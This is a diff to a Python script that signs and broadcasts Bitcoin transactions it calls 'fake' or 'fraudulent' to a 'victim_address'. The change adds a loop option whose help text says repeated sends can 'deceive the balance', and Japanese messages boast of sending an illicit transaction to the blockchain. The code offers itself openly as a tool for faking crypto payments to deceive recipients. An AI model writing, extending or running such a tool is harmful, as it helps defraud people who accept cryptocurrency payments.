@@ -1,4 +1,5 @@
 import argparse
+import time
 import requests
 import subprocess
 import bitcoin.rpc
@@ -31,12 +32,15 @@ parser.add_argument("fake_send_to",
 parser.add_argument("amount_of_coins",
                     help="Amount of coins sent. (Enter in BTC units) The maximum amount delayed will vary depending on send_from.",
                     type=float)
-
 parser.add_argument("--is_testnet",
                     help="Testnet flag (Default=True)",
                     default=True,
                     type=bool)
-
+parser.add_argument("--loop_count",
+                    "-count",
+                    help="How many fraudulent transactions to submit? If the balance is low, it may be possible to deceive the balance by sending it multiple times. (Default is 1.)",
+                    default=1,
+                    type=int)
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
     return round(btc_amount / satoshi)
@@ -74,6 +78,10 @@ fake_send_from   = args.send_from_wifkey
 victim_address   = args.fake_send_to
 amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
+loop_count = args.loop_count
+
+if loop_count <= 0:
+    loop_count = 1
 
 transaction_util = cryptos.Bitcoin(testnet=testnet)
 print("Connecting Public Node...")
@@ -98,52 +106,59 @@ if balance < send_amount:
     exit()
 
 change_btc_amt = (balance - send_amount) #おつり
-if testnet:
-    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
-else:
-    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
-
-tx_victim = transaction_util.mktx(inputs, tx_victim)
-tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
-if testnet:
-    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
-print()
-print("--------------------")
-print(f"Fake Send to                       : {victim_address}")
-print(f"Fake Send Amount (Satoshi unit)    : {send_amount} Satoshi")
-print(f"Signed  RawTx             : {tx_victim}")
-print(f"Testnet Mode              : {testnet}")
-print("--------------------")
-print()
-print()
-print("[+] READY...")
-print()
-
-print()
-print("OK")
 
 input(" --- If you really want to continue, press enter. --- ")
-print()
-print("Index > 強固なブロックチェーンに対して強制干渉を開始...")
-print()
-broadcast_transaction(tx_victim, testnet)
-print("SND ITX TOBC  (ブロックチェーンに不正なトランザクションを送信!)")
-print()
-#ゴリ押し
-print()
-#おまけ
-print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
-print()
 
-sound_name = "ImagineBreaker.mp3"
-try:
-    import soundplay
-    soundplay.playsound(sound_name)
-except:
-    # Termux Only
-    imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
-    subprocess.run(imagine_breaker_cmd)
+for i  in range(loop_count):
+
+    print(f"Fake Transaction {i}...")
+    if testnet:
+        tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
+    else:
+        tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
+
+    tx_victim = transaction_util.mktx(inputs, tx_victim)
+    if testnet:
+        tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
+    else:
+        tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
+    
+    if i == 0:
+        print()
+        print("--------------------")
+        print(f"Fake Send to                       : {victim_address}")
+        print(f"Fake Send Amount (Satoshi unit)    : {send_amount} Satoshi")
+        print(f"Signed  RawTx             : {tx_victim}")
+        print(f"Testnet Mode              : {testnet}")
+        print("--------------------")
+        print()
+        print()
+
+    print()
+
+    print()
+    print("Index > 強固なブロックチェーンに対して強制干渉を開始...")
+    print()
+    broadcast_transaction(tx_victim, testnet)
+    print("SND ITX TOBC  (ブロックチェーンに不正なトランザクションを送信!)")
+    print()
+    #ゴリ押し
+    print()
+    #おまけ
+    print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
+    print()
+
+    sound_name = "ImagineBreaker.mp3"
+    try:
+        import soundplay
+        soundplay.playsound(sound_name)
+    except:
+        # Termux Only
+        imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
+        subprocess.run(imagine_breaker_cmd)
+    time.sleep(1) #休ませる
 
 print("----------------")
 balance = transaction_util.get_balance(victim_address)
+print(f"fake send to address Balance (satoshi unit) :{balance}")
 print("Done.")
